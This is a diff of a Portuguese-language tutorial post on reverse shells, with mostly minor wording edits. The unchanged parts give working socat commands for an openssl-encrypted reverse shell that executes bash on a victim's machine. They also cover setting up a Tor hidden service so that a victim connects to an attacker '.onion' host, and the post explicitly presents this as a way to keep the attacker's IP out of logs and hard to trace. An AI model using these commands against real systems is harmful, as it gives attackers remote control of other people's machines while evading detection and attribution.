@@ -13,11 +13,11 @@
 
 ## O que é shell ?
 
-Para entendermos o que é shell reverso, precisamos falar de shell. Podemos definir um shell como uma ligação entre o sistema e o usuário. Podemos dizer o shell tem a finalidade de interpretar comandos, transmiti-los ao sistema e devolver os resultados através do um terminal. A vários tipos de interpretadores shell em sistemas Unix/Linux sendo os mais comuns o sh , o bash ,csh o Tcsh , ksh , e o zsh.
+Para entendermos o que é shell reverso precisamos falar de shell. Podemos definir um shell como uma ligação entre o sistema e o usuário. Podemos dizer que o shell tem a finalidade de interpretar comandos, transmiti-los ao sistema e devolver os resultados. A vários tipos de interpretadores shell em sistemas Unix/Linux sendo os mais comuns o sh , o bash ,csh o Tcsh , ksh , e o zsh.
 
 ## Shell Reverso
 
-É uma técnica utilizada para enviar comandos de um shell remotamente por uma porta. Assim permite que o atacante abra uma porta de escuta em seu servidor e através dessa porta receber conexões de outras máquinas permitindo assim controla-las.
+É uma técnica utilizada para enviar comandos de um shell remotamente por uma porta e assim permite que o atacante abra uma porta de escuta em seu servidor para receber conexões de outras máquinas permitindo assim controla-las.
 
 <p align="center">
   <a href="#" target="blank"><img src="https://media.geeksforgeeks.org/wp-content/uploads/20211126190050/reverseshell.png" alt="" /></a>
@@ -25,7 +25,7 @@ Para entendermos o que é shell reverso, precisamos falar de shell. Podemos defi
 
 Com acesso a máquina comprometida, o atacante poderá escalar privilégios para ter acesso administrativo ao sistema.
 
-Existem vários tipos de [shell reverso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), mas utilizarei o socat.
+Podemos criar [shell reverso] (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) de várias formas, nesse post utilizarei o socat.
 
 Primeiramente instale o socat e o openssl:
 
@@ -77,13 +77,13 @@ socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
 ```
 ## Shell reverso utilizando a rede tor
 
-Em sistemas robustos são guardados logs de conexões. Desta forma o endereço de ip da atacante seria facimente descoberto. Para tornar o endereço do atacante desconhecido, o atacante precisa ter o tor instalado:
+Em sistemas robustos são guardados vários logs, inclusive de conexões. Assim o endereço de ip da atacante seria facimente descoberto em uma auditoria. Mas utilizando a rede tor o atacante consegue tornar seu endereço de ip desconhecido, ele deve ter o tor instalado:
 
 ```bash
 apt install tor
 ```
 
-Agora o atacante precisa do proxy tor para redirecionar o servidor socat para rede tor. Para isso, a o atacante precisa adicionar as seguintes linhas ao arquivo <strong>/etc/tor/torrc</strong>
+Agora o atacante precisa do proxy tor para redirecionar o servidor socat para rede tor. Para isso, o atacante precisa adicionar as seguintes linhas ao arquivo ao final do arquivo <strong>/etc/tor/torrc</strong>:
 
 ```
 HiddenServiceDir /var/lib/tor/hidden/
@@ -91,20 +91,19 @@ HiddenServicePort 1111 127.0.0.1:1111
 ```
 Desta forma, todas as requisições que vierem da rede tor pela porta 1111 serão redirecionadas para localhost:1111.
 
-Agora reinicie o proxy tor:
+Agora reinicie o tor:
 
 ```
 systemctl restart tor
 ```
 
-Para descobrir qual é o host do atacante na rede tor:
+Para descobrir qual é o domínio do atacante na rede tor, digite:
 
 ```bash
 cat /var/lib/tor/service/hidden/hostname
 
-# Aparecerá algo algo assim
-# Exemplo
-dominio-do-atacante.onion
+# Aparecerá algo algo assim, exemplo:
+domínio-do-atacante.onion
 ```
 
 O atacante deve executar:
@@ -117,18 +116,18 @@ socat file:`tty`,raw,echo=0 TCP-L:$PORT
 A vítima deverá ter o tor instalado, e deverá executar:
 
 ```bash
-HOST=dominio-do-atacante.onion
+HOST=domínio-do-atacante.onion
 PORT=1111
 torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
 ```
 
 ## Observação
 
-Vale lembrar que você pode criptografar o shell reverso na rede tor, mas por causa das camadas de criptografia da rede, a conexão ficará muito lenta! Mas agora é extremamente difícil para vitima identificar o atacante.
+Vale lembrar que você pode criptografar o shell reverso na rede tor usando o openssl como foi mostrado acima. Mas por causa das camadas de criptografia da rede, a conexão ficará muito lenta! Podemos dizer que é extremamente difícil identificar o atacante. Abaixo coloquei alguns links de algumas pessoas conhecidas no meio de cyber security.
 
 ## **📚 Referências**
 
-- [Van Houser](https://github.com/vanhauser-thc?tab=repositories) participação na série Mr. Robot, criador do hydra, [etc...](https://www.thc.org/)
+- [Van Houser](https://github.com/vanhauser-thc?tab=repositories) participação na série Mr. Robot, criador do Hydra, [etc...](https://www.thc.org/)
 
 - [Hackers-cheats](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)
 
